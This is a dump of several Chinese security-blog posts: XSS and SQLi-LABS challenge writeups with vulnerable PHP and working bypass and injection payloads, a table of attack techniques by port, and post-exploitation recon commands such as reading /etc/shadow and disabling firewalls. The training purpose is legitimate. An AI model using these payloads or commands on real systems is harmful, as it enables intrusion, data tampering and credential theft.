这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。如果javascript:URL中的javascript代码含有多个语句，必须使用分号将这些语句分隔开。 通常想用javascript:URL执行某些不改变当前显示的文档的javascript代码。要做到这一点，必须确保URL中的最后一条语句没有返回值。一种方法是用void运算符显式地把返回值指定为underfined，只需要在javascript:URL的结尾使用语句void 0;即可。 answer:这里的对on和 &lt;script进行了过滤。不过这次没有过滤尖括号&lt;&gt;，这里使用伪协议来构造payload 123\"&gt;&lt;iframe src=javascript:alert(1)&gt;\"&gt; &lt;a href=\"javascript:alert(1)\"&gt;bmjoker&lt;/a&gt;\"&gt; &lt;a href=\"javascript:%61lert(1)\"&gt;bmjoker&lt;/a&gt; // level6123456789101112131415&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str2=str_replace(\"&lt;script\",\"&lt;scr_ipt\",$str);$str3=str_replace(\"on\",\"o_n\",$str2);$str4=str_replace(\"src\",\"sr_c\",$str3);$str5=str_replace(\"data\",\"da_ta\",$str4);$str6=str_replace(\"href\",\"hr_ef\",$str5);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword value=\"'.$str6.'\"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; answer:这里没有将字母同意转化为小写，可以大小写绕过。 1\"&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;&lt;\" level7123456789101112131415&lt;?php ini_set(\"display_errors\", 0);$str =strtolower( $_GET[\"keyword\"]);$str2=str_replace(\"script\",\"\",$str);$str3=str_replace(\"on\",\"\",$str2);$str4=str_replace(\"src\",\"\",$str3);$str5=str_replace(\"data\",\"\",$str4);$str6=str_replace(\"href\",\"\",$str5);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword value=\"'.$str6.'\"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; answer:双写绕过 1\" onclick=alert(1) \" level812345678910111213141516&lt;?php ini_set(\"display_errors\", 0);$str = strtolower($_GET[\"keyword\"]);$str2=str_replace(\"script\",\"scr_ipt\",$str);$str3=str_replace(\"on\",\"o_n\",$str2);$str4=str_replace(\"src\",\"sr_c\",$str3);$str5=str_replace(\"data\",\"da_ta\",$str4);$str6=str_replace(\"href\",\"hr_ef\",$str5);$str7=str_replace('\"','&amp;quot',$str6);echo '&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword value=\"'.htmlspecialchars($str).'\"&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; answer:使用html进制编码，服务器可能没有过滤，浏览器会自动解析&amp;#116就字母t的实体编码 123javascrip&amp;#x74;:alert(1)javascrip&amp;#x0074;:alert(1)javascrip&amp;#116;:alert(1) 点击链接成功xss level91234567891011121314151617181920212223242526&lt;?php ini_set(\"display_errors\", 0);$str = strtolower($_GET[\"keyword\"]);$str2=str_replace(\"script\",\"scr_ipt\",$str);$str3=str_replace(\"on\",\"o_n\",$str2);$str4=str_replace(\"src\",\"sr_c\",$str3);$str5=str_replace(\"data\",\"da_ta\",$str4);$str6=str_replace(\"href\",\"hr_ef\",$str5);$str7=str_replace('\"','&amp;quot',$str6);echo '&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword value=\"'.htmlspecialchars($str).'\"&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt;&lt;?phpif(false===strpos($str7,'http://'))&#123; echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"您的链接不合法？有没有！\"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'; &#125;else&#123; echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"'.$str7.'\"&gt;友情链接&lt;/a&gt;&lt;/center&gt;';&#125;?&gt; answer: 123javascrip&amp;#x74;:alert(1)//http://xxx.com //利用注释javascrip&amp;#x74;:%0dhttp://xxx.com%0dalert(1) //不利用注释javascrip&amp;#x74;:%0ahttp://xxx.com%0aalert(1) //不利用注释 level101234567891011121314&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str11 = $_GET[\"t_sort\"];$str22=str_replace(\"&gt;\",\"\",$str11);$str33=str_replace(\"&lt;\",\"\",$str22);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"'.$str33.'\" type=\"hidden\"&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; answer: 1http://127.0.0.1/xss/level10.php?t_link=&amp;t_history=&amp;t_sort=\" onclick=alert(1) type=\"button\" level1112345678910111213141516&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str00 = $_GET[\"t_sort\"];$str11=$_SERVER['HTTP_REFERER'];$str22=str_replace(\"&gt;\",\"\",$str11);$str33=str_replace(\"&lt;\",\"\",$str22);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt;&lt;input name=\"t_ref\" value=\"'.$str33.'\" type=\"hidden\"&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; answer:xss注入，开始抓包，burp修改相应的字段，构造http头部Referer的payload: 12Referer: \" onmouseover=alert(1) type=\"text\"Referer: \" onclick=\"alert(1) type=\"text\" level1212345678910111213141516&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str00 = $_GET[\"t_sort\"];$str11=$_SERVER['HTTP_USER_AGENT'];$str22=str_replace(\"&gt;\",\"\",$str11);$str33=str_replace(\"&lt;\",\"\",$str22);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt;&lt;input name=\"t_ua\" value=\"'.$str33.'\" type=\"hidden\"&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; burp修改相应的字段，构造http头部User-agent的payloadanswer: 12Referer: \" onmouseover=alert(1) type=\"text\"Referer: \" onclick=\"alert(1) type=\"text\" level131234567891011121314151617&lt;?php setcookie(\"user\", \"call me maybe?\", time()+3600);ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str00 = $_GET[\"t_sort\"];$str11=$_COOKIE[\"user\"];$str22=str_replace(\"&gt;\",\"\",$str11);$str33=str_replace(\"&lt;\",\"\",$str22);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt;&lt;input name=\"t_cook\" value=\"'.$str33.'\" type=\"hidden\"&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; burp修改相应的字段，构造http头部Cookie的payloadanswer: 12Cookie: user=\" onmouseover=alert(1) type=\"text\"Cookie: user=\" onclick=\"alert(1) type=\"text\" level141&lt;center&gt;&lt;iframe name=\"leftframe\" marginwidth=10 marginheight=10 src=\"http://www.exifviewer.org/\" frameborder=no width=\"80%\" scrolling=\"no\" height=80%&gt;&lt;/iframe&gt;&lt;/center&gt; answer:exif viewer的漏洞,很久以前的漏洞无法复现 level1512345&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"src\"];echo '&lt;body&gt;&lt;span class=\"ng-include:'.htmlspecialchars($str).'\"&gt;&lt;/span&gt;&lt;/body&gt;';?&gt; answer:ng-include有包含文件的意思，也就相当于php里面的include发现可以包含第一关的页面，构造payload: src里面的内容还需url编码一下。src=&#39;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#39; 1src='level1.php?name=&lt;img src=x onerror=alert(1)&gt;' level16123456789&lt;?php ini_set(\"display_errors\", 0);$str = strtolower($_GET[\"keyword\"]);$str2=str_replace(\"script\",\"&amp;nbsp;\",$str);$str3=str_replace(\" \",\"&amp;nbsp;\",$str2);$str4=str_replace(\"/\",\"&amp;nbsp;\",$str3);$str5=str_replace(\" \",\"&amp;nbsp;\",$str4);echo \"&lt;center&gt;\".$str5.\"&lt;/center&gt;\";?&gt; answer:分析代码，发现大小写绕过失效，script , / , ,等都被转换成&amp;nbsp，我们可以用%0d，%0a等绕过,构造payload： 123&lt;img%0Dsrc=1%0Donerror=alert(1)&gt;&lt;iframe%0asrc=x%0donmouseover=alert`1`&gt;&lt;/iframe&gt;&lt;svg%0aonload=alert`1`&gt;&lt;/svg&gt; level171234&lt;?phpini_set(\"display_errors\", 0);echo \"&lt;embed src=xsf01.swf?\".htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).\" width=100% heigth=100%&gt;\";?&gt; answer: 123arg01=123&amp;arg02= onmouseover=alert(1)arg01=123&amp;arg02=%20onmousedown=alert`1`arg01=123&amp;arg02= onmouseover=alert(1) type=\"text\" level181234&lt;?phpini_set(\"display_errors\", 0);echo \"&lt;embed src=xsf02.swf?\".htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).\" width=100% heigth=100%&gt;\";?&gt; answer: 123arg01=123&amp;arg02= onmouseover=alert(1)arg01=123&amp;arg02=%20onmousedown=alert`1`arg01=123&amp;arg02= onmouseover=alert(1) type=\"text\" level19flash xssFlash XSS攻击总结 1234&lt;?phpini_set(\"display_errors\", 0);echo '&lt;embed src=\"xsf03.swf?'.htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).'\" width=100% heigth=100%&gt;';?&gt; answer: 1arg01=version&amp;arg02=&lt;a href=\"javascript:alert(1)\"&gt;123&lt;/a&gt;&lt;/pre&gt; level20zeroclipboard xss Flash XSS检测脚本的简单实现 xss常用绕过方法1、大小写绕过 1&lt;ScRIpT&gt;alert('123')&lt;/sCRIpT&gt; 2、编码绕过 十六进制编码 jsfuck编码 url编码 unicode编码 12&lt;0x736372697074&gt;alert('123')&lt;/0x736372697074&gt;&lt;img src=\"1\" onerror=\"alert&amp;#x28;1&amp;#x29;\"&gt; 3、绕过magic_quotes_gpc 1&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)&lt;/script&gt; 4、标签闭合标签 12\"&gt;&lt;script&gt;alert(/123/)&lt;/script&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; 标签绕过 123456&lt;img src=\"x\" onerror=\"alert(1)\"&gt;&lt;button onclick=\"javascript:alert('xss')&gt;XSS&lt;/button\"&gt;&lt;title&gt;&lt;img a=\"&lt;/title&gt;&lt;img/src=1 onerror=alert(1)//\"&gt;\"onsubmit=javascript:alert(1)%20name=\"a&lt;details open ontoggle=\"eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))\"&gt;&lt;video src=\"http://www.0dutv.com/plug/down/up2.php/104678898.mp3\" onprogress=(′body′).prepend(123);(′body′).prepend(123);('body')&gt;&lt;/video&gt; 5、其他符号绕过%0a 替换空格%0d 替换空格/**/ 替换空格%00 截断`` 替换括号6、双字符绕过 12&lt;img ononerrorerror=\"123\"&gt;&lt;script&gt;alalertert(123)&lt;/script&gt; 7、宽字节绕过 gbxxxx系列的编码，那么我们尝试一下宽字节 %c0，%bf，%5c，%df8、其他事件绕过 123456onloadonclickonerrorpromptconfirmonmousemove 9、CRLF injection绕过CRLF是”回车 + 换行”（\\r\\n）的简称。 1http://www.xxx.com%0d%0a%0d%0a&lt;svg/onload=prompt(1)&gt; 参考文章：那些年我们一起学XSSxss挑战平台练习xss挑战1-20关全通Writeup","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/tags/web%E5%AE%89%E5%85%A8/"},{"name":"XSS","slug":"XSS","permalink":"https://blog.cfyqy.com/tags/XSS/"}],"author":"ye1s"},{"title":"渗透测试初期之信息收集","slug":"渗透测试初期之信息收集","date":"2020-06-18T15:54:00.000Z","updated":"2020-06-23T05:00:43.736Z","comments":true,"path":"article/7c3ef54c.html","link":"","permalink":"https://blog.cfyqy.com/article/7c3ef54c.html","excerpt":"渗透站点相关资产收集","text":"渗透站点相关资产收集 0x1IP地址0x2子域名0x3主机0x3.1C 段0x3.2端口 端口号 端口说明 攻击技巧 21/22/69 ftp/tftp：文件传输协议 允许匿名上传、下载、爆破、嗅探、溢出和后门 22 ssh：远程连接 爆破OpenSSH；28个退格 23 telnet：远程连接 爆破\\嗅探、弱口令 25 smtp：邮件服务 邮件伪造 53 DNS：域名系统 DNS区域传输\\DNS劫持\\DNS缓存投毒\\DNS欺骗\\利用DNS隧道技术刺透防火墙 67/68 dhcp 劫持\\欺骗 80/443/8080 常见web服务端口 web攻击、爆破、对应服务器版本漏洞 110 pop3 爆破、嗅探 139 samba 爆破\\未授权访问\\远程代码执行 143 imap 爆破 161 snmp 爆破 389 ldap目录访问协议 注入攻击\\未授权访问，弱口令 512/513/514 linux rexec 直接使用rlogin\\爆破 873 rsync 未授权访问\\文件上传 1080 socket 爆破：进行内网渗透 1352 lotus Domino邮件服务 爆破：弱口令\\信息泄漏：源代码 1433 mssql 爆破：使用系统用户登录\\注入攻击\\SA弱口令 1521 oracle 爆破：TNS\\注入攻击\\反弹shell 2049 nfs 配置不当 2181 zookeeper 未授权访问 3306 mysql 爆破\\拒绝服务\\注入\\提权 3389 rdp 爆破\\Shift后门 3690 SVN服务 SVN泄露\\未授权访问 4848 glassfish 爆破：控制台弱口令\\认证绕过 5000 sybase/DB2 爆破\\注入 5432 postgresql 缓冲区溢出\\注入攻击\\爆破：弱口令 5632 pcanywhere 拒绝服务\\代码执行，抓取密码 5900 vnc 爆破：弱口令\\认证绕过 6379 redis 未授权访问\\爆破：弱口令 7001/7002 weblogic Java反序列化\\控制台弱口令\\控制台部署webshell 8069 zabbix 远程命令执行\\SQL注入 8080/8089 JBoss/Resin/Jetty/Jenkins 反序列化、控制台弱口令 9090 websphere控制台 爆破：控制台弱口令\\Java反序列 9200/9300 elasticsearch 远程代码执行 10000 webmin控制面板 弱口令 11211 memcacache 未授权访问 27017/27018 mongodb 爆破\\未授权访问 50000 SAP Management Console 远程执行 0x4 Web 信息0x4.1Web技术0x4.2目录结构0x4.3中间件0x4.4数据库0x5 Web 基础漏洞0x6 Web 业务逻辑漏洞","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.cfyqy.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"信息收集","slug":"信息收集","permalink":"https://blog.cfyqy.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"author":"ye1s"},{"title":"SQLi-LABS Page-3 (Stacked Injections)","slug":"SQLi-LABS-Page-3-Stacked-Injections","date":"2020-06-16T07:28:00.000Z","updated":"2020-06-18T06:38:24.316Z","comments":true,"path":"article/e3dccaf5.html","link":"","permalink":"https://blog.cfyqy.com/article/e3dccaf5.html","excerpt":"SQLi-LABS3","text":"SQLi-LABS3 Less-38堆叠查询 1234567891011121314151617181920212223242526272829303132333435363738$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";/* execute multi query */if (mysqli_multi_query($con1, $sql))&#123; /* store first result set */ if ($result = mysqli_store_result($con1)) &#123; if($row = mysqli_fetch_row($result)) &#123; echo '&lt;font size = \"5\" color= \"#00FF00\"&gt;'; printf(\"Your Username is : %s\", $row[1]); echo \"&lt;br&gt;\"; printf(\"Your Password is : %s\", $row[2]); echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125;// mysqli_free_result($result); &#125; /* print divider */ if (mysqli_more_results($con1)) &#123; //printf(\"-----------------\\n\"); &#125; //while (mysqli_next_result($con1));&#125;else &#123; echo '&lt;font size=\"5\" color= \"#FFFF00\"&gt;'; print_r(mysqli_error($con1)); echo \"&lt;/font&gt;\"; &#125;/* close connection */mysqli_close($con1);&#125; tips:在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。answer: 1http://192.168.3.7/sqli/Less-38/?id=1';insert into users(id,username,password) values (120,'root','root')--+ Less-39整形堆叠查询 Less-40同上，’)闭合，并且错误不回显 Less-41同上，无闭合，错误不回显 Less-42登录密码输入框那里存在堆叠注入 12username=a' or 1#password=a 登录失败，下面换成password试试： 12username=apassword=a' or 1# 登录成功，所以password没有经过过滤，所以在这进行构造 Less-43跟上题一样思路，’)闭合 Less-44与42关基本一样，区别在：没有回显信息 123$username = mysqli_real_escape_string($con1, $_POST[\"login_user\"]);$password = $_POST[\"login_password\"];$sql = \"SELECT * FROM users WHERE username='$username' and password='$password'\"; Less-45且为 ‘) 闭合 Less-46order by 延迟注入 1234$id=$_GET['sort']; $sql = \"SELECT * FROM users ORDER BY $id\";$result = mysql_query($sql); sort=1 desc 或者asc。显示的结果不同，所以可以注入看看在MySQL 5中的SELECT语法： 1234567891011121314151617181920SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr ...] [FROM table_references [WHERE where_condition] [GROUP BY &#123;col_name | expr | position&#125; [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY &#123;col_name | expr | position&#125; [ASC | DESC], ...] [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;] [PROCEDURE procedure_name(argument_list)] [INTO OUTFILE 'file_name' export_options | INTO DUMPFILE 'file_name' | INTO var_name [, var_name]] [FOR UPDATE | LOCK IN SHARE MODE]] 盲注基于时间的盲注 12http:&#x2F;&#x2F;192.168.3.7&#x2F;sqli&#x2F;Less-46&#x2F;?sort&#x3D;if(1&#x3D;1,sleep(3),1) %23http:&#x2F;&#x2F;192.168.3.7&#x2F;sqli&#x2F;Less-46&#x2F;?sort&#x3D;if(1&#x3D;2,sleep(3),1) %23 基于布尔的盲注 报错注入 1http://192.168.3.7/sqli/Less-46/?sort=updatexml(1,substr(concat(0x23,(select group_concat(password) from users ),0x23),65,96),1)%23 Less-47如上 ，单引号闭合 Less-48order by 时间盲注 1http:&#x2F;&#x2F;192.168.3.7&#x2F;sqli&#x2F;Less-48&#x2F;?sort&#x3D;if(1&#x3D;1,sleep(3),1) %23 Less-49同上 单引号闭合 Less-50order by 堆叠查询 Less-51堆叠查询 Less-52堆叠查询 Less-53堆叠查询","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/tags/web%E5%AE%89%E5%85%A8/"},{"name":"sql注入","slug":"sql注入","permalink":"https://blog.cfyqy.com/tags/sql%E6%B3%A8%E5%85%A5/"}],"author":"ye1s"},{"title":"ATT&CK_Discovery","slug":"ATT-CK-Discovery","date":"2020-06-10T08:25:00.000Z","updated":"2020-06-18T15:55:36.392Z","comments":true,"path":"article/8f3fc18d.html","link":"","permalink":"https://blog.cfyqy.com/article/8f3fc18d.html","excerpt":"内网信息收集主要包括当前主机的信息、当前主机所处的网络环境的拓扑结构以及主机所处的位置等。渗透的本质是信息收集，信息收集的深度关系直接关系到了内网渗透的失败。","text":"内网信息收集主要包括当前主机的信息、当前主机所处的网络环境的拓扑结构以及主机所处的位置等。渗透的本质是信息收集，信息收集的深度关系直接关系到了内网渗透的失败。 System Information Discovery系统信息发现查询操作系统和版本信息window 1234systeminfo 系统信息 echo %PROCESSOR_ARCHITECTURE% #系统体系结构var 版本wmic qfe get caption,description,hotfixid,installedon 查看补丁 linux 123cat /etc/issue 查看系统名称cat /etc/lsb-release 查看系统名称、版本号uname -a 查看内核信息 例子： 12root@iZnbnu828xckp1Z:~# uname -aLinux iZnbnu828xckp1Z 4.15.0-52-generic #56-Ubuntu SMP Tue Jun 4 22:49:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 各个部分详解 12345678Linux 内核名称 uname -s iZnbnu828xckp1Z 节点名 uname -n4.15.0-52-generic 内核发行号 uname -r #56-Ubuntu SMP Tue Jun 4 22:49:08 UTC 2019 内核版本 uname -v x86_64 主机的硬件架构名称 uname -mx86_64 处理器类型 uname -px86_64 硬件平台 uname -iGNU&#x2F;Linux 操作系统 uname -o System Network Configuration Discovery系统网络配置发现包括如下几个部分1.查看网络配置window 1ipconfig /all linux 1ifconfig 2.查看arp缓存表 1arp -a 3.查询路由表window 1route print linux 1route 4.防火墙window 123netsh firewall show config 查看防火墙 winserver 2003之前：netsh firewall set opmode disable 关闭防火墙winserver 2003之后：netsh advfirewall set allprofiles state off 关闭防火墙 System Network Connections Discovery系统网络连接发现window 123netstat 网络连接信息 net use 检索网络连接列表net session 显示所有与本地计算机的会话的信息 linux 1234lsof -i (udp/tcp) 列出当前所有的网络连接 who 命令显示关于当前在本地系统上的所有用户的信息 netstat -lntup tcp和udp端口连接情况 说明： l:listening n:num t:tcp u:udp p:process 查看代理 1reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" System Owner/User Discoverywindow 123net user 查看本机用户列表net localgroup administrators 获取本地管理员 query user ||quinsta 查看在线用户 linux 12345678910whoami #我现在登录的用户id #当前用户idid test #查看test用户信息w #查看当前系统活动用户lastlog #查看用户登录日志cat /etc/passwd #查看用户列表cat /etc/shadow #获取用户hashcat /etc/group #查看用户组grep -v -E \"^#\" /etc/passwd | awk -F: '$3==0&#123;print $1&#125;' #列出超级用户awk -F: '($3==\"0\")&#123;print&#125;' /etc/passwd #列出超级用户详细信息 #注意空格 System Service Discoverywindow 123wmic service list brieftasklist /svcnet start linux 12345678910service -status-all 检查所有服务状态systemctl -a 列出安装在文件系统中的所有单元.service servicename status 显示某个服务状态信息systemctl status servicename 显示某个服务状态信息cat /etc/services /etc/ services将端口号映射到指定的服务.service servicename start 启动某个服务systemctl start servicename 启动某个服务service servicename stop 停止某个服务systemctl stop servicename 停止某个服务 Process Discoverywindow 123tasklist 查看当前进程列表和进程用户wmic process list brief 查看进程信息top top命令显示您的Linux机器的处理器活动 linux 12345678910111213ps aux #查看全部进程信息ps -ef #同上两者没太大区别，格式和列略有出入ps -ef | grep java #查看java进程信息``` # System Time Discovery# Software Discoverywindow ```bashwmic product get name,version 查询已安装的软件及版本信息Get-WmiObject -class win32_product | Select-Object -property name,version linux 12dpkg -l #查看安装的软件包rpm -qa #查看安装的软件包 Account DiscoveryApplication Window Discoverywindow 1wmic startup get command,caption 查看已启动的程序信息 Browser Bookmark DiscoveryDomain Trust DiscoveryFile and Directory DiscoveryNetwork Share Discoverywindow 12net share wmic share get name,path,status Network SniffingPassword Policy DiscoveryPeripheral Device DiscoveryPermission Groups DiscoveryQuery RegistryRemote System Discovery查询远程服务 1reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlset\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber 连接端口为16进制数0xd3d，转换为10进制就是3389 查看同网段主机 1FOR /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.0.%I | findstr \"TTL=\" Security Software Discovery常见的杀毒软件 12345678910360sd.exe 360杀毒360tray.exe 360实时保护ZhuDongFangYu.exe 360主动防御KSafeTray.exe 金山卫士SafeDogUpdateCenter.exe 安全狗McAfee McShield.exe McAfeeegui.exe NOD32AVP.exe 卡巴斯基avguard.exe 小红伞bdagent.exe BitDefender Virtualization/Sandbox Evasion参考文章内网渗透之信息收集-Linux系统篇Pentest WiKi Part1 信息收集内网渗透初识—信息收集后渗透攻防的信息收集之CMD下信息收集域渗透基础简单信息收集","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"ATT&CK","slug":"ATT-CK","permalink":"https://blog.cfyqy.com/tags/ATT-CK/"},{"name":"Discovery","slug":"Discovery","permalink":"https://blog.cfyqy.com/tags/Discovery/"}],"author":"ye1s"},{"title":"SQLi-LABS Page-2 (Adv Injections)","slug":"QLi-LABS-Page-2-Adv-Injections","date":"2020-06-09T00:31:00.000Z","updated":"2020-06-16T07:23:20.848Z","comments":true,"path":"article/6d9c4fd7.html","link":"","permalink":"https://blog.cfyqy.com/article/6d9c4fd7.html","excerpt":"SQLI-LABS 2","text":"SQLI-LABS 2 Less-23过滤了#、–的注释 123456$reg = \"/#/\";$reg1 = \"/--/\";$replace = \"\";$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id);$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; 1.可以使用 ;%00 来绕过 1http://192.168.3.7/sqli/Less-23/?id=-1' union select 1,(select database()),3;%00 这样分号之前的语句会被执行，%00是空格的意思，所以这是一种绕过限制的方式。2.闭合引号,报错注入or ‘a’=’a 1http:&#x2F;&#x2F;192.168.3.7&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1&#39; and extractvalue(1,concat(0x5c,(select user()),0x5c)) or &#39;1&#39;&#x3D;&#39;1 Less-24二次注入的方法：注册时候将sql语句插入了数据库，当再次调用这个恶意构造的字符时，就可以出发sql注入 1234567891011121314151617181920212223242526272829$username= $_SESSION[\"username\"];$curr_pass= mysql_real_escape_string($_POST['current_password']);$pass= mysql_real_escape_string($_POST['password']);$re_pass= mysql_real_escape_string($_POST['re_password']);if($pass==$re_pass)&#123; $sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \"; $res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( '); $row = mysql_affected_rows(); echo '&lt;font size=\"3\" color=\"#FFFF00\"&gt;'; echo '&lt;center&gt;'; if($row==1) &#123; echo \"Password successfully updated\"; &#125; else &#123; header('Location: failed.php'); //echo 'You tried to be smart, Try harder!!!! :( '; &#125;&#125;else&#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;&lt;center&gt;'; echo \"Make sure New Password and Retype Password fields have same value\"; header('refresh:2, url=index.php');&#125; 先注册 12admin&#39; #test 然后再修改密码就可以修改已知用户的密码 123testadminadmin 其中修改密码的sql执行如下 1$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;admin&#39; where username&#x3D;&#39;admin&#39; # and password&#x3D;&#39;test&#39; &quot;; Less-25过滤了or and 也影响了 order 和informatinon_shchema 两个关键字 1234567891011121314151617181920212223242526 $id= blacklist($id); $hint=$id; $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) &#123; echo \"&lt;font size='5' color= '#99FF00'&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125;function blacklist($id)&#123; $id= preg_replace('/or/i',\"\", $id); //strip out OR (non case sensitive) $id= preg_replace('/AND/i',\"\", $id); //Strip out AND (non case sensitive) return $id;&#125; tips1.and 用&amp;&amp; 代替，or 用||代替2.利用重写:or 用oorr 代替,and 用anandd 代替 answer:判断是否有注入注意： &amp;在url中会被当做参数的分隔符，所以要编码一下 12http://192.168.3.7/sqli/Less-25/?id=1' %26%26 '1'='1http://192.168.3.7/sqli/Less-25/?id=1' %26%26 '1'='2 判断字段数 1http://192.168.3.7/sqli/Less-25/?id=1' oorrder by 4--+ 得到数据库名 1http://192.168.3.7/sqli/Less-25/?id=-1' union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+ Less-25a整形注入，过滤了and和or 123456789101112131415161718192021222324252627282930313233import timeimport requestsdef binary(): 